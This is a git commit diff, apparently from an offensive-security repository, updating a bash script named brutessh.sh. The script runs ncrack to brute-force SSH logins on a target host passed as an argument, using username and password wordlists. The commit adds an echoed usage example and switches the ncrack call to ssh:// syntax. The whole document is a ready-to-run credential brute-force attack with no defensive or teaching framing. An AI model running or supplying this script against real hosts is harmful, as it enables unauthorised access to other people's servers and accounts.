e9f04fc54621dfdd8c46f77945cddba06e0cdfa5
hackingyseguridad <antonio_taboada@hotmail.es>
2022-06-24 22:44:40 +0200

    Update brutessh.sh

--- brutessh.sh
+++ brutessh.sh
@@ -1,3 +1,6 @@
 #!/bin/bash
+echo 
+echo "ncrack ssh://1.1.1.1:65535 -U usuarios.txt -P claves.txt"
+echo 
 echo $1 "<======================"
-ncrack $1 -p 22 -U usuarios.txt -P claves.txt
+ncrack ssh://$1:22 -U usuarios.txt -P claves.txt
